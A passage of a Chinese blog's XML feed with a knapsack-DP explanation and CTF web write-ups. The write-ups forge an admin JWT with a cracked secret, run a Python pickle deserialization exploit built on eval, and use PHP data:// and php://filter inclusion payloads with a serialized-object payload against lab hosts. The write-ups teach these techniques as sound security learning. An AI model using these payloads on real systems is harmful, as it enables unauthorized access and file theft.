alt=""><br>典型的完全背包，背包容量换成了时间，物品就是药品。<br>还是先确定dp数组的含义，不过这题不能用二维数组了，i和j都可以达到10000，时间会爆的，所以只能用一维数组<br>那么dp[i]的定义就为当时间剩余i时，且第i种药还没有采时(第i种药可以无限次采摘)所采的药的最大价值</p><p>第二步求递推公式<br>对第i种草药我们有采和不采两种选择，如果选择采的话，那么<code>dp[i]=dp[i-a[i]]+v[i]</code><br>不采的话<code>dp[i]=dp[i]</code>，综合两种情况来看，<code>dp[i]=max(dp[i-a[i]]+v[i],dp[i])</code></p><p>在前面的01背包中，我们是从后往前遍历物品的价值，但完全背包不一样，完全背包要累计同一个物品的价值多次，完全背包的前一个状态可能依然是累加完同一个物品后的状态<br>从前往后更新，我们选择的是根据当前的状态值来更新本次的结果，从后往前更新，我们选择的是根据上一次的状态值来更新本次的结果<br>01背包是根据上一次的状态值来更新的，dp[i]与dp[i-1]有关<br>完全背包的二维数组为:<code>f[i][j] = max(f[i-1][j], f[i][j - weight[i]] + value[i])</code><br>由于一个物品可以被选择多次，更新f[i][j]时，f[i][j- weight[i]]可能因为放入物品i而发生变化。</p><p>整体代码如下</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstdio></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> T<span class="token punctuation">,</span>M<span class="token punctuation">,</span>t<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span><span class="token number">100001</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">100000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cin<span class="token operator">>></span>T<span class="token operator">>></span>M<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>M<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>T<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//要从所有值中找出最大值</span>    <span class="token punctuation">{</span>        ans<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>今天就先记录这么多，以后有时间在记录</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态规划 </tag>
            
            <tag> C </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web2]ikun</title>
      <link href="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/"/>
      <url>/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/</url>
      
        <content type="html"><![CDATA[<p>打开环境，喜闻乐见<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/1.jpg" alt=""><br>先注册一个账号<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/3.jpg" alt=""><br>然后找一找信息<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/2.jpg" alt=""><br>要找到lv6<br>往下翻了几页，好想挺多页的样子，手工找不出来，写个脚本吧</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://63d2c3fa-95be-449a-afe2-1e07c97c0013.node3.buuoj.cn/shop?page=%d"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u <span class="token operator">=</span> url <span class="token operator">%</span> i    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在测试第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lv6在第%d页"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/4.jpg" alt=""><br>找到lv6在181页<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/5.jpg" alt=""><br>购买<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/6.jpg" alt=""><br>好像买不起的样子<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/7.jpg" alt=""><br>果然买不起<br>那开着burp看看请求<br>注意到有一个discount折扣字样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/8.jpg" alt=""><br>那把折扣改成0试一下<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/9.jpg" alt=""><br>操作失败<br>那把折扣改为不为0的很小的数字试试<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/10.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/11.jpg" alt=""><br>购买成功到了另一个页面，显示只允许admin访问<br>可能和cookie之类的有关，再次访问抓包<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/12.jpg" alt=""><br>注意到有一个JWT字段</p><pre class=" language-bash"><code class="language-bash">Json web token <span class="token punctuation">(</span>JWT<span class="token punctuation">)</span>, 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<span class="token punctuation">(</span>RFC 7519<span class="token punctuation">)</span>.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密</code></pre><p>一种token，用来认证的</p><pre class=" language-bash"><code class="language-bash">JWT的构成第一部分我们称它为头部（header<span class="token punctuation">)</span>,第二部分我们称其为载荷（payload, 类似于飞机上承载的物品<span class="token punctuation">)</span>，第三部分是签证（signature<span class="token punctuation">)</span>.</code></pre><p>整体就差不多是这样<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/13.jpg" alt=""><br>不过JWT可以破解，python中的pyjwt模块等，在这里我们用<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>这个工具破解<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/14.jpg" alt=""><br>破解很快，加密密钥就是1Kun<br>然后我们到这个网站去进行在线加密<a href="https://jwt.io/" target="_blank" rel="noopener"></a><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/15.jpg" alt=""><br>把密钥替换为1Kun，用户名替换为admin，将新的JWT替换到我们的请求信息当中<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/16.jpg" alt=""><br>成功以admin身份登录<br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/17.jpg" alt=""><br>发现了一个压缩文件，下载来看看<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/18.jpg" alt=""><br>是这个网站的源代码<br>又到了头疼的代码审计环节。。。<br>挨个挨个看吧</p><hr><p>好吧实在审不来，看wp吧<br>有一个python反序列化漏洞，在Admin.py </p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    @tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>漏洞代码出现在这里</p><pre class=" language-python"><code class="language-python">become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>关于python反序列化漏洞可以看看这篇文章<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p><pre class=" language-bash"><code class="language-bash">当序列化以及反序列化的过程中中碰到一无所知的扩展类型<span class="token punctuation">(</span>这里指的就是新式类<span class="token punctuation">)</span>的时候，可以通过类中定义的__reduce__方法来告知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化，那这就非常好，那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和 tuple ,我们的构造点就在令其返回 tuple 的时候当他返回值是一个元祖的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable object<span class="token punctuation">(</span>可调用的对象<span class="token punctuation">)</span>，第二个参数可以是一个元祖为这个可调用对象提供必要的参数，如果你认真看上面的 PVM 的指令码，你就会发现这个返回值和其中的一个 R 指令非常的一致，（我猜测这个 R 指令码就是这个 __reduce__ 方法的返回值的底层实现 ）</code></pre><pre class=" language-bash"><code class="language-bash">urllib.unquote<span class="token punctuation">(</span><span class="token punctuation">)</span>字符串被当作url提交时会被自动进行url编码处理pickle.dump<span class="token punctuation">(</span>obj, file<span class="token punctuation">[</span>, protocol<span class="token punctuation">]</span><span class="token punctuation">)</span>序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。pickle.load<span class="token punctuation">(</span>file<span class="token punctuation">)</span>反序列化对象。将文件中的数据解析为一个Python对象。</code></pre><p>exp如下(要在python2下运行)</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a</code></pre><p>再将a传给become即可<br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/10/ciscn2019-hua-bei-sai-qu-day1-web2-ikun/20.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python反序列化 </tag>
            
            <tag> pickle，Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ZJCTF 2019]NiZhuanSiWei</title>
      <link href="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/"/>
      <url>/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/</url>
      
        <content type="html"><![CDATA[<p>打开环境，直接给出了源代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;h1>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>审计源代码<br>可以传入text,file和password参数，file参数需要我们传入一个文件，且文件内容为”welcome to the zjctf”<br>用file_get_contents读取file参数<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#data" target="_blank" rel="noopener">文件包含漏洞与php伪协议</a><br>我们可以用data://伪协议将内容写然后再让file_get_contents读取<br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/1.jpg" alt=""><br>往后看<br>file会被include，但flag被过滤了，所以我们不能直接包含flag.php<br>但给了提示有useless.php,那我们就包含useless.php<br>可以用php://filter伪协议读取useless.php的源代码<br>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>useless.php</code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/2.jpg" alt=""><br>将得到的base64字符串解码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>"U R <span class="token constant">SO</span> <span class="token constant">CLOSE</span> <span class="token operator">!</span><span class="token comment" spellcheck="true">///COME ON PLZ");</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  </code></pre><p>审计代码<br>定义了Flag类，有一个file属性<br>__tostring()魔术方法会读取file的内容</p><p>再看到之前的代码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span></code></pre><p>输出反序列化之后的password参数<br>据此，我们可以将Flag类的file属性设置为flag.php，然后传入password参数即可</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$a"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</span><span class="token delimiter">?></span></code></pre><p>payload:</p><pre class=" language-bash"><code class="language-bash">http://89071de8-6fdf-46b3-877a-fc3da9efac70.node3.buuoj.cn/?text<span class="token operator">=</span>data://text/plain<span class="token punctuation">;</span>base64,d2VsY29tZSB0byB0aGUgempjdGY<span class="token operator">=</span><span class="token operator">&amp;</span>file<span class="token operator">=</span>useless.php<span class="token operator">&amp;</span>password<span class="token operator">=</span>O:4:<span class="token string">"Flag"</span>:1:<span class="token punctuation">{</span>s:4:<span class="token string">"file"</span><span class="token punctuation">;</span>s:8:<span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/10/zjctf-2019-nizhuansiwei/3.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> data伪协议 </tag>
            
            <tag> filter伪协议 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/"/>
      <url>/LawlietLW.github.io/2020/02/09/buuctf-2018-online-tool/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><a href="1.jpg"></a><br>直接给出源代码，代码审计</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  